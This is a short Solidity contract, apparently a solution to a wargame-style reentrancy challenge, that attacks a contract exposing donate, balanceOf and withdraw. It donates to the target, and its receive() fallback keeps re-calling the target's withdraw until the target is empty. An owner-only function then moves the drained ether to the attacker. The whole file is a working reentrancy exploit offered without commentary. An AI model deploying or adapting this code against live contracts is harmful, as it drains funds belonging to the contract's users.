interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;
}

contract Reentrancy {   

    IReentrance public contractToAttack;
    address public owner;
    uint public amount;

    constructor(address _contract_address) public {
        contractToAttack = IReentrance(_contract_address);
        owner = msg.sender;
    }

    function donate() public payable {
        contractToAttack.donate{value: msg.value}(address(this));
        amount = msg.value;
    }   

    function withdraw() public {
        require(owner == msg.sender, "Only owner");
        msg.sender.transfer(address(this).balance);
    }

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }

    receive() external payable {
        if (address(contractToAttack).balance != 0){            
            contractToAttack.withdraw(amount);
        }    
    } 
}
